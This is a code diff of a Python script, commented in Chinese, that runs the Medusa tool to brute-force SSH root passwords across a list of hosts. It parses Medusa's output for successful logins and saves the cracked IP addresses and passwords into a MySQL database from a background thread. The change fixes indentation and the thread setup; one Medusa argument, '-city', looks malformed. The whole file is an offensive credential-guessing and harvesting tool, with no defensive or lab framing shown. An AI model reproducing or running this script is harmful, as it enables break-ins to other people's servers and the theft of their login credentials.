@@ -50,30 +50,32 @@ def insert_data():
     lock.release()
 
 # 监听Medusa输出，并解析IP地址和密码
+
 def read_medusa():
     global ip_addr
     global password
 
     # 执行Medusa命令，将输出通过管道传递给程序
-    #cmd = "medusa -H Host.txt -u root -P /root/pass.txt -M ssh -t 5 -f -O output.txt -continue 2>&1 | tee output.txt"
-    #os.system(cmd)
     medusa_process = subprocess.Popen(['medusa', '-H', 'Host.txt', '-u', 'root', '-P', 'pass.txt', '-M', 'ssh', '-city', '-v', '4', '-t', '5', '-f', '-O', 'output.txt'],
-                                     stdout=subprocess.PIPE, bufsize=1)
+                                      stdout=subprocess.PIPE, bufsize=1)
 
-output = ''
-# 逐行读取medusa输出结果并进行处理
-for line in iter(medusa_process.stdout.readline, b''):
-    # 处理每一行输出结果的代码
-    output += line.decode().strip()
-    if '[SUCCESS]' in output:
-        ip_addr = re.findall(r"Host: (.+?) User", output)
-        password = re.findall(r'Password: (.+?) \[SUCCESS\]', output)
-        insert_data()
     output = ''
-    # 插入数据到MySQL
+    # 逐行读取medusa输出结果并进行处理
+    for line in iter(medusa_process.stdout.readline, b''):
+        # 处理每一行输出结果的代码
+        output += line.decode().strip()
+        if '[SUCCESS]' in output:
+            ip_addr = re.findall(r"Host: (.+?) User", output)
+            password = re.findall(r'Password: (.+?) \[SUCCESS\]', output)
+            # 插入数据到MySQL
+            output = ''
+            insert_data()
+        
+        
+    # 返回medusa_process对象
     return medusa_process
 
 # 启动线程，监听Medusa输出并插入数据到MySQL
 medusa_process = read_medusa()
-thread = threading.Thread(target=read_medusa, args=(medusa_process,))
+thread = threading.Thread(target=read_medusa)
 thread.start()
